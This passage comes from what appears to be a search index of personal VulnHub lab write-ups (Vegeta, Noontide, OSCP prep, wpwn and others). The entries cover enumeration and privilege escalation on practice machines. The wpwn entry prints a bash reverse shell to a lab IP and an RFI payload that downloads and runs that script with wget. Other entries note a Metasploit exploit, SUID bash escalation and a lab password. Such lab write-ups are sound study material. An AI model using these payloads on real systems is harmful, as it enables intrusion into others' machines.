string in an HTML comment. We couldn't decode this to anything useful. Looked at a walkthrough, which finds /bulba/ There is a .wav file which has a morse code encoded message. trunks u$3r we should be able to log in with ssh trunks@192.168.1.113 we are owner of the /etc/passwd file and if we look at the history we see a command that adds a new user Tom with root permissions. We run the command, and log into Tom's account with su Tom Root flag \u00b6","title":"Vegeta"},{"location":"VulnHub/Vegeta/#vegeta","text":"netdiscover finds this IP 192.168.1.113 autorecon finds port 22 and port 80. we found an entry in robots.txt and followed it This brings us to a page with some encoded string in an HTML comment. We couldn't decode this to anything useful. Looked at a walkthrough, which finds /bulba/ There is a .wav file which has a morse code encoded message. trunks u$3r we should be able to log in with ssh trunks@192.168.1.113 we are owner of the /etc/passwd file and if we look at the history we see a command that adds a new user Tom with root permissions. We run the command, and log into Tom's account with su Tom","title":"Vegeta"},{"location":"VulnHub/Vegeta/#root-flag","text":"","title":"Root flag"},{"location":"VulnHub/Y0usef/","text":"Y0usef \u00b6 192.168.1.104 Ports \u00b6 22/tcp open ssh syn-ack ttl 64 OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0) 80/tcp open http syn-ack ttl 64 Apache httpd 2.4.10 ((Ubuntu)) Port 80 \u00b6","title":"Y0usef"},{"location":"VulnHub/Y0usef/#y0usef","text":"192.168.1.104","title":"Y0usef"},{"location":"VulnHub/Y0usef/#ports","text":"22/tcp open ssh syn-ack ttl 64 OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0) 80/tcp open http syn-ack ttl 64 Apache httpd 2.4.10 ((Ubuntu))","title":"Ports"},{"location":"VulnHub/Y0usef/#port-80","text":"","title":"Port 80"},{"location":"VulnHub/noontide/","text":"Noontide \u00b6 Enumeration \u00b6 Netdiscover found the IP: 192.168.1.133 autorecon found 3 ports open: - 6667 - 6697 - 8067 All 3 of these ports seem to be running UnrealIRCd 3.2.8.1 and we were able to find a few exploits for this on searchsploit We opted to use the metasploit module, and gained a shell as the user server User flag \u00b6 we ran through some enumeration, noticed sudo is not available on this machine. after exhausting all thinkable resources, we looked at a walkthrough, and found the username and password are root:root we just need to su root root Root flag \u00b6","title":"Noontide"},{"location":"VulnHub/noontide/#noontide","text":"","title":"Noontide"},{"location":"VulnHub/noontide/#enumeration","text":"Netdiscover found the IP: 192.168.1.133 autorecon found 3 ports open: - 6667 - 6697 - 8067 All 3 of these ports seem to be running UnrealIRCd 3.2.8.1 and we were able to find a few exploits for this on searchsploit We opted to use the metasploit module, and gained a shell as the user server","title":"Enumeration"},{"location":"VulnHub/noontide/#user-flag","text":"we ran through some enumeration, noticed sudo is not available on this machine. after exhausting all thinkable resources, we looked at a walkthrough, and found the username and password are root:root we just need to su root root","title":"User flag"},{"location":"VulnHub/noontide/#root-flag","text":"","title":"Root flag"},{"location":"VulnHub/oscp%20prep/","text":"OSCP prep \u00b6 22/tcp open ssh syn-ack ttl 64 OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) 80/tcp open http syn-ack ttl 64 Apache httpd 2.4.41 ((Ubuntu)) 33060/tcp open socks5 syn-ack ttl 64 dirbuster found robots.txt which leads to secret.txt The content of secret.txt was a base64 encoded ssh key. The description mentions the only user on this box is oscp. log in as oscp: ssh -i id_rsa oscp@192.168.1.133 The SUID bit was set on /bin/bash , GTFObins also found some creds (probably won't need these though) becoming root is as easy as /bin/bash -p I am root","title":"OSCP prep"},{"location":"VulnHub/oscp%20prep/#oscp-prep","text":"22/tcp open ssh syn-ack ttl 64 OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) 80/tcp open http syn-ack ttl 64 Apache httpd 2.4.41 ((Ubuntu)) 33060/tcp open socks5 syn-ack ttl 64 dirbuster found robots.txt which leads to secret.txt The content of secret.txt was a base64 encoded ssh key. The description mentions the only user on this box is oscp. log in as oscp: ssh -i id_rsa oscp@192.168.1.133 The SUID bit was set on /bin/bash , GTFObins also found some creds (probably won't need these though) becoming root is as easy as /bin/bash -p I am root","title":"OSCP prep"},{"location":"VulnHub/wpwn/","text":"wpwn \u00b6 netdiscover found this running on 192.168.1.178 a port scan revealed ports 22 and 80 were open. port 80 is hosting wordpress in /wordpress/ we ran wpscan, which found a vulnerable plugin: Social Warfare 3.5.2 By reading EDB-46794 we found an endpoint that has potential for RFI. We are able to get a shell by creating shell.sh with the following content: #!/bin/bash /bin/bash -i >& /dev/tcp/192.168.1.109/8080 0>&1 we then started a listener, and hosted this payload for RFI <pre>system('wget http://192.168.1.109:80/shell.sh && /bin/bash shell.sh')</pre> this gives us shell as www-data linpeas findings database wordpress_db db user wp_user db password R3&]vzhHmMn9,:-5 We were able to find the admin hash in the wp_users table on this db. We are able to login as takis using the DB password. ssh takis@192.168.1.178 R3&]vzhHmMn9,:-5 takis is able to run any command with SUDO. get root with sudo su we looked at a walkthrough to find the root flag: find / root 2>/dev/null | grep USB leads us to /usr/games/usb/root Root flag \u00b6","title":"wpwn"},{"location":"VulnHub/wpwn/#wpwn","text":"netdiscover found this running on 192.168.1.178 a port scan revealed ports 22 and 80 were open. port 80 is hosting wordpress in /wordpress/ we ran wpscan, which found a vulnerable plugin: Social Warfare 3.5.2 By reading EDB-46794 we found an endpoint that has potential for RFI. We are able to get a shell by creating shell.sh with the following content: #!/bin/bash /bin/bash -i >& /dev/tcp/192.168.1.109/8080 0>&1 we then started a listener, and hosted this payload for RFI <pre>system('wget http://192.168.1.109:80/shell.sh && /bin/bash shell.sh')</pre> this gives us shell as www-data linpeas findings database wordpress_db db user wp_user db password R3&]vzhHmMn9,:-5 We were able to find the admin hash in the wp_users table on this db. We are able to login as takis using the DB password. ssh takis@192.168.1.178 R3&]vzhHmMn9,:-5 takis is able to run any command with SUDO. get root with sudo su we looked at a walkthrough to find the root flag: find / root 2>/dev/null | grep USB leads us to /usr/games/usb/root","title":"wpwn"},{"location":"VulnHub/wpwn/#root-flag","text":"","title":"Root flag"}]}